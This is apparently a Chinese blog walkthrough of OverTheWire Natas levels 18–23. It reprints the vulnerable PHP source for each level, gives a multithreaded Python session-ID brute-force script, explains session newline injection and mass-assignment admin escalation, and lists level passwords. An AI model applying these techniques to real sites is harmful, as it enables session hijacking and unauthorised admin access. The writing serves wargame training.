<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200210143041922.png" alt="image-20200210143041922"></p>
<p>查看源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$maxid</span> = <span class="number">640</span>; <span class="comment">// 640 should be enough for everyone</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidAdminLogin</span>(<span class="params"></span>) </span>&#123; <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;username&quot;</span>] == <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">    <span class="comment">/* This method of authentication appears to be unsafe and has been disabled for now. */</span></span><br><span class="line">        <span class="comment">//return 1;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isValidID</span>(<span class="params"><span class="variable">$id</span></span>) </span>&#123; <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$id</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createID</span>(<span class="params"><span class="variable">$user</span></span>) </span>&#123; <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$maxid</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="variable">$maxid</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">debug</span>(<span class="params"><span class="variable">$msg</span></span>) </span>&#123; <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;debug&quot;</span>, <span class="variable">$_GET</span>)) &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;DEBUG: <span class="subst">$msg</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">my_session_start</span>(<span class="params"></span>) </span>&#123; <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;PHPSESSID&quot;</span>, <span class="variable">$_COOKIE</span>) <span class="keyword">and</span> <span class="title function_ invoke__">isValidID</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;PHPSESSID&quot;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">session_start</span>()) &#123;</span><br><span class="line">        <span class="title function_ invoke__">debug</span>(<span class="string">&quot;Session start failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">debug</span>(<span class="string">&quot;Session start ok&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;admin&quot;</span>, <span class="variable">$_SESSION</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">debug</span>(<span class="string">&quot;Session was old: admin flag set&quot;</span>);</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;admin&quot;</span>] = <span class="number">0</span>; <span class="comment">// backwards compatible, secure</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_credentials</span>(<span class="params"></span>) </span>&#123; <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SESSION</span> <span class="keyword">and</span> <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;admin&quot;</span>, <span class="variable">$_SESSION</span>) <span class="keyword">and</span> <span class="variable">$_SESSION</span>[<span class="string">&quot;admin&quot;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;&lt;pre&gt;Username: natas19\n&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$showform</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">my_session_start</span>()) &#123;</span><br><span class="line">    <span class="title function_ invoke__">print_credentials</span>();</span><br><span class="line">    <span class="variable">$showform</span> = <span class="literal">false</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;username&quot;</span>, <span class="variable">$_REQUEST</span>) &amp;&amp; <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;password&quot;</span>, <span class="variable">$_REQUEST</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">createID</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;username&quot;</span>]));</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;admin&quot;</span>] = <span class="title function_ invoke__">isValidAdminLogin</span>();</span><br><span class="line">    <span class="title function_ invoke__">debug</span>(<span class="string">&quot;New session started&quot;</span>);</span><br><span class="line">    <span class="variable">$showform</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="title function_ invoke__">print_credentials</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$showform</span>) &#123;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>服务端通过验证 PHPSESSID 来确认身份，范围在640以内，爆破即可：</p>
<p>利用Burp：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211095953166.png" alt="image-20200211095953166"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211100025482.png" alt="image-20200211100025482"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211100447711.png" alt="image-20200211100447711"></p>
<h2 id="Level-19"><a href="#Level-19" class="headerlink" title="Level 19"></a>Level 19</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211102211284.png" alt="image-20200211102211284"></p>
<p>抓包查看PHPSESSID：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211102237920.png" alt="image-20200211102237920"></p>
<p>多次请求，发现返回的PHPSESSID后一部分都相同</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211102326468.png" alt="image-20200211102326468"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211102335129.png" alt="image-20200211102335129"></p>
<p>这一串字符像十六进制编码，转字符串后得到：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211102424647.png" alt="image-20200211102424647"></p>
<p>应该是 id-username </p>
<p>爆破脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># Time: 2020/2/11 10:31</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> queue</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DoRun</span>(threading.Thread):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, queue</span>):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self._queue = queue</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self._queue.empty():</span><br><span class="line">            encodeID = self._queue.get()</span><br><span class="line">            headers = &#123;</span><br><span class="line">                <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&quot;Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==&quot;</span>,</span><br><span class="line">                <span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&quot;PHPSESSID=&quot;</span> + encodeID</span><br><span class="line">            &#125;</span><br><span class="line">            res = requests.post(url, headers=headers)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(res.text) != <span class="number">1050</span>:</span><br><span class="line">                <span class="built_in">print</span>(res.text)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;.&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://natas19.natas.labs.overthewire.org/index.php&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    threads = []</span><br><span class="line">    threads_count = <span class="number">50</span></span><br><span class="line">    Queue = queue.Queue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">id</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">641</span>):</span><br><span class="line">        code = <span class="built_in">str</span>(<span class="built_in">id</span>) + <span class="string">&quot;-admin&quot;</span></span><br><span class="line">        encodeID = <span class="string">&#x27;&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)).replace(<span class="string">&#x27;0x&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> c <span class="keyword">in</span> code])</span><br><span class="line">        Queue.put(encodeID)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(threads_count):</span><br><span class="line">        threads.append(DoRun(Queue))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">        i.start()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> threads:</span><br><span class="line">        i.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Level-20"><a href="#Level-20" class="headerlink" title="Level 20"></a>Level 20</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211114208651.png" alt="image-20200211114208651"></p>
<p>查看源码:</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myread</span>(<span class="params"><span class="variable">$sid</span></span>) </span>&#123; </span><br><span class="line">    <span class="title function_ invoke__">debug</span>(<span class="string">&quot;MYREAD <span class="subst">$sid</span>&quot;</span>); </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strspn</span>(<span class="variable">$sid</span>, <span class="string">&quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-&quot;</span>) != <span class="title function_ invoke__">strlen</span>(<span class="variable">$sid</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">debug</span>(<span class="string">&quot;Invalid SID&quot;</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">session_save_path</span>() . <span class="string">&quot;/&quot;</span> . <span class="string">&quot;mysess_&quot;</span> . <span class="variable">$sid</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">        <span class="title function_ invoke__">debug</span>(<span class="string">&quot;Session file doesn&#x27;t exist&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">debug</span>(<span class="string">&quot;Reading from &quot;</span>. <span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;\n&quot;</span>, <span class="variable">$data</span>) <span class="keyword">as</span> <span class="variable">$line</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">debug</span>(<span class="string">&quot;Read [<span class="subst">$line</span>]&quot;</span>);</span><br><span class="line">    <span class="variable">$parts</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot; &quot;</span>, <span class="variable">$line</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$parts</span>[<span class="number">0</span>] != <span class="string">&quot;&quot;</span>) <span class="variable">$_SESSION</span>[<span class="variable">$parts</span>[<span class="number">0</span>]] = <span class="variable">$parts</span>[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">session_encode</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">mywrite</span>(<span class="params"><span class="variable">$sid</span>, <span class="variable">$data</span></span>) </span>&#123; </span><br><span class="line">    <span class="comment">// $data contains the serialized version of $_SESSION</span></span><br><span class="line">    <span class="comment">// but our encoding is better</span></span><br><span class="line">    <span class="title function_ invoke__">debug</span>(<span class="string">&quot;MYWRITE <span class="subst">$sid</span> <span class="subst">$data</span>&quot;</span>); </span><br><span class="line">    <span class="comment">// make sure the sid is alnum only!!</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strspn</span>(<span class="variable">$sid</span>, <span class="string">&quot;1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-&quot;</span>) != <span class="title function_ invoke__">strlen</span>(<span class="variable">$sid</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">debug</span>(<span class="string">&quot;Invalid SID&quot;</span>); </span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">session_save_path</span>() . <span class="string">&quot;/&quot;</span> . <span class="string">&quot;mysess_&quot;</span> . <span class="variable">$sid</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">debug</span>(<span class="string">&quot;Saving in &quot;</span>. <span class="variable">$filename</span>);</span><br><span class="line">    <span class="title function_ invoke__">ksort</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_SESSION</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">debug</span>(<span class="string">&quot;<span class="subst">$key</span> =&gt; <span class="subst">$value</span>&quot;</span>);</span><br><span class="line">        <span class="variable">$data</span> .= <span class="string">&quot;<span class="subst">$key</span> <span class="subst">$value</span>\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">    <span class="title function_ invoke__">chmod</span>(<span class="variable">$filename</span>, <span class="number">0600</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>查看DEBUG信息：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211114343529.png" alt="image-20200211114343529"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$_SESSION</span> = <span class="keyword">array</span>();</span><br><span class="line">   <span class="keyword">foreach</span>(<span class="title function_ invoke__">explode</span>(<span class="string">&quot;\n&quot;</span>, <span class="variable">$data</span>) <span class="keyword">as</span> <span class="variable">$line</span>) &#123;</span><br><span class="line">       <span class="title function_ invoke__">debug</span>(<span class="string">&quot;Read [<span class="subst">$line</span>]&quot;</span>);</span><br><span class="line">   <span class="variable">$parts</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot; &quot;</span>, <span class="variable">$line</span>, <span class="number">2</span>);</span><br><span class="line">   <span class="keyword">if</span>(<span class="variable">$parts</span>[<span class="number">0</span>] != <span class="string">&quot;&quot;</span>) <span class="variable">$_SESSION</span>[<span class="variable">$parts</span>[<span class="number">0</span>]] = <span class="variable">$parts</span>[<span class="number">1</span>];</span><br><span class="line">   &#125; </span><br></pre></td></tr></table></figure>

<p>这里会将 $data 的值按行处理，比如这里 <code>data</code> 里的内容是 <code>name admin</code> 经过拆分后，设置 <code>$_SESSION[&#39;name&#39;] = admin</code> </p>
<p>那么可以构造 data 数据，令 SESSION 中的 admin &#x3D; 1</p>
<p><code>data = admin \n admin 1\n </code></p>
<p>直接修改请求包：<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211115607201.png" alt="image-20200211115607201"></p>
<p>再次请求即可得到密码：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211115830586.png" alt="image-20200211115830586"></p>
<h2 id="Level-21"><a href="#Level-21" class="headerlink" title="Level 21"></a>Level 21</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">IFekPyrQXftziDEsUr3x21sYuahypdgJ</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211120112869.png" alt="image-20200211120112869"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">print_credentials</span>(<span class="params"></span>) </span>&#123; <span class="comment">/* &#123;&#123;&#123; */</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_SESSION</span> <span class="keyword">and</span> <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;admin&quot;</span>, <span class="variable">$_SESSION</span>) <span class="keyword">and</span> <span class="variable">$_SESSION</span>[<span class="string">&quot;admin&quot;</span>] == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;&lt;pre&gt;Username: natas22\n&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* &#125;&#125;&#125; */</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">print_credentials</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211120153515.png" alt="image-20200211120153515"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>  </span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// if update was submitted, store it</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;submit&quot;</span>, <span class="variable">$_REQUEST</span>)) &#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$val</span>) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;debug&quot;</span>, <span class="variable">$_GET</span>)) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;[DEBUG] Session contents:&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// only allow these keys</span></span><br><span class="line"><span class="variable">$validkeys</span> = <span class="keyword">array</span>(<span class="string">&quot;align&quot;</span> =&gt; <span class="string">&quot;center&quot;</span>, <span class="string">&quot;fontsize&quot;</span> =&gt; <span class="string">&quot;100%&quot;</span>, <span class="string">&quot;bgcolor&quot;</span> =&gt; <span class="string">&quot;yellow&quot;</span>);</span><br><span class="line"><span class="variable">$form</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$form</span> .= <span class="string">&#x27;&lt;form action=&quot;index.php&quot; method=&quot;POST&quot;&gt;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$validkeys</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$defval</span>) &#123;</span><br><span class="line">    <span class="variable">$val</span> = <span class="variable">$defval</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$key</span>, <span class="variable">$_SESSION</span>)) &#123;</span><br><span class="line">    <span class="variable">$val</span> = <span class="variable">$_SESSION</span>[<span class="variable">$key</span>];</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="variable">$key</span>] = <span class="variable">$val</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$form</span> .= <span class="string">&quot;<span class="subst">$key</span>: &lt;input name=&#x27;<span class="subst">$key</span>&#x27; value=&#x27;<span class="subst">$val</span>&#x27; /&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$form</span> .= <span class="string">&#x27;&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Update&quot; /&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$form</span> .= <span class="string">&#x27;&lt;/form&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$style</span> = <span class="string">&quot;background-color: &quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&quot;bgcolor&quot;</span>].<span class="string">&quot;; text-align: &quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&quot;align&quot;</span>].<span class="string">&quot;; font-size: &quot;</span>.<span class="variable">$_SESSION</span>[<span class="string">&quot;fontsize&quot;</span>].<span class="string">&quot;;&quot;</span>;</span><br><span class="line"><span class="variable">$example</span> = <span class="string">&quot;&lt;div style=&#x27;<span class="subst">$style</span>&#x27;&gt;Hello world!&lt;/div&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>直接在链接的页面POST的数据中添加 <code>admin=1</code> </p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211120733742.png" alt="image-20200211120733742"></p>
<p>然后携带此PHPSESSID去请求原页面，即可得到密码</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211120815810.png" alt="image-20200211120815810"></p>
<h2 id="Level-22"><a href="#Level-22" class="headerlink" title="Level 22"></a>Level 22</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ</span><br></pre></td></tr></table></figure>

<p>查看代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;revelio&quot;</span>, <span class="variable">$_GET</span>)) &#123;</span><br><span class="line">    <span class="comment">// only admins can reveal the password</span></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$_SESSION</span> <span class="keyword">and</span> <span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;admin&quot;</span>, <span class="variable">$_SESSION</span>) <span class="keyword">and</span> <span class="variable">$_SESSION</span>[<span class="string">&quot;admin&quot;</span>] == <span class="number">1</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line">    </span><br><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;revelio&quot;</span>, <span class="variable">$_GET</span>)) &#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;You are an admin. The credentials for the next level are:&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;&lt;pre&gt;Username: natas23\n&quot;</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>需要GET一个revelio，同时如果存在revelio会重定向回首页，所以要抓包查看返回的密码</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211122500537.png" alt="image-20200211122500537"></p>
<h2 id="Level-23"><a href="#Level-23" class="headerlink" title="Level 23"></a>Level 23</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20200211122550862.png" alt="image-20200211122550862"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">array_key_exists</span>(<span class="string">&quot;passwd&quot;</span>,<span class="variable">$_REQUEST</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$_REQUEST</span>[<span class="string">&quot;passwd&quot;</span>],<span class="string">&quot;iloveyou&quot;</span>) &amp;&amp; (<span class="variable">$_REQUEST</span>[<span class="string">&quot;passwd&quot;</span>] &gt; <span class="number">10</span> ))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;The credentials for the next level are:&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Username: natas24 Password: &lt;censored&gt;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;Wrong!&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// morla / 10111</span></span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<blockquote>
<p> strstr — 查找字符串的首次出现</p>
<p><a href="https://www.php.net/manual/zh/function.strstr.php">https://www.php.net/manual/zh/function.strstr.php</a></p>
</blockquote>
